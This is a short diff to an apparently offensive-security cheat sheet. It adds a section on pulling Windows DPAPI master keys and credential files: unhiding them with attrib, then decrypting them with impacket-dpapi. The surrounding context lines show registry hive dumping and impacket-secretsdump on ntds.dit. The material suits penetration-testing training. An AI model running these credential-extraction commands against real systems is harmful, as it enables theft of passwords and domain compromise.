@@ -116,6 +116,25 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
 ```
 
+## 8.5 DPAPI Master Keys & Credentials Files 
+
+```bash
+# Copy from file path and download. If files are hidden, try the command. 
+gci . force 
+
+# Change the file attribue. 
+attrib -s -h FILENAME 
+masterKey
+credLocal
+credRoaming
+
+# After downloading files. Use impacket with current user password. 
+impacket-dpapi masterkey -file masterKey -sid S-1-5-21-xxxxx -password '$PASS' 
+# Then 
+impacket-dpapi credentials -ffile credRoaming -key 0xdaxxxxxxx
+
+```
+
 ---
 
 [← Prev: 07 — Lateral Movement Techniques](07-lateral-movement.md) | [Next: 09 — MSSQL Attacks & Linked Server Chains →](09-mssql-attacks.md)
